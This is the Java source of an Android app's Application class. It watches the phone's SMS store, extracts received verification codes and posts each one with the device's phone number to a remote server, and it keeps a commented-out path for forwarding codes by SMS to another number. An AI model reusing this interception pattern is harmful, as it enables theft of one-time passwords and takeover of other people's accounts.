package com.kuaishan.obtainmsg.core;

import android.app.Application;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.HashMap;

import androidx.multidex.MultiDex;
import cn.jpush.android.api.JPushInterface;


public class App extends Application {
    private SmsObserver mObserver;
    public static final int MSG_RECEIVED_CODE = 1;

    @Override
    public void onCreate() {
        super.onCreate();
        JPushInterface.setDebugMode(true);
        JPushInterface.init(this);
        mObserver = new SmsObserver(this, new MsgHandler(this));
        Uri uri = Uri.parse("content://sms");
        getContentResolver().registerContentObserver(uri, true, mObserver);
    }

    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        MultiDex.install(this);
    }

    public static class MsgHandler extends Handler {
        private Context activity;

        public MsgHandler(Context activity) {
            this.activity = activity;
        }

        @Override
        public void handleMessage(Message msg) {

            if (msg.what == MSG_RECEIVED_CODE) {
                String code = (String) msg.obj;
                T.i("receive code " + code);
//                                sendSMSS(leaderMobile, code,activity.get());
                saveMesage2Server(activity, code);
            }
        }
    }


    //发送短信
    public static void sendSMSS(String phone, String content, Context context) {
        if (!TextUtils.isEmpty(content) && !TextUtils.isEmpty(phone)) {
            SmsManager manager = SmsManager.getDefault();
            ArrayList<String> strings = manager.divideMessage(content);
            for (int i = 0; i < strings.size(); i++) {
                manager.sendTextMessage(phone, null, strings.get(i), null, null);
            }
            Toast.makeText(context, "发送成功", Toast.LENGTH_SHORT).show();
        } else {
            Utils.toast(context, "手机号或内容不能为空");
            return;
        }
    }


    private static void saveMesage2Server(final Context context, String content) {
        final HashMap map = new HashMap();
        map.put("mobile", Utils.getPhone(context));
        map.put("message", content);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            AdhocExecutorService.getInstance().execute(new Runnable() {
                @Override
                public void run() {
                    final String str = NetWorkUtils.sendMessge(Constants.Url.SAVESMS, map);
                    if (!TextUtils.isEmpty(str)) {
                        if (str.contains("ok")) {
                            T.i(str);
                            Utils.toast(context, str);
                        }
                    }
                }
            });
        }
    }
}
